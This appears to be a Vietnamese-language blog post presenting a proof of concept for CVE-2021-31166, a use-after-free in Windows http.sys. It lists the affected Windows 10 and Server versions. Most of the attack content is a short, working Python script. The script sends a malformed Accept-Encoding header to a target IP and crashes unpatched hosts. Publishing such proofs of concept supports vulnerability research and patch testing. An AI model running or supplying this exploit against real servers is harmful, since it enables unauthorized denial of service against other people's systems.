---
title: CVE-2021-31166
date: 16/6/2021
layout: single
header:
  teaser: /assets/images/cve.PNG
--- 
[![Language](https://img.shields.io/badge/Lang-Python-blue.svg)](https://www.python.org)

---


## Mô Tả 

Đây là bằng chứng về khái niệm cho CVE-2021-31166 ("Lỗ hổng thực thi mã từ xa của ngăn xếp giao thức HTTP"), một điểm truy cập sử dụng sau khi miễn phí trong `http.sys` được Microsoft vá vào tháng 5 năm 2021.

Theo như tôi biết, nó chỉ có thể kích hoạt chương trình bị lỗi, hãy sử dụng nó một cách thận trọng.

--- 
## Các nền tảng bị ảnh hưởng 
+ Windows Server, version 20H2 (Server Core Installation)

+ Windows 10 Version 20H2 for ARM64-based Systems

+ Windows 10 Version 20H2 for 32-bit Systems

+ Windows 10 Version 20H2 for x64-based Systems

+ Windows Server, version 2004 (Server Core installation)

+ Windows 10 Version 2004 for x64-based Systems

+ Windows 10 Version 2004 for ARM64-based Systems

+ Windows 10 Version 2004 for 32-bit Systems

# Demo
![demo](https://raw.githubusercontent.com/0vercl0k/CVE-2021-31166/main/pics/trigger.gif)
## Python

---
```python 
# python file.py --target=ip
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('PoC for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    args = parser.parse_args()
    r = requests.get(f'http://{args.target}/', headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()

```

---

## Thanks :D
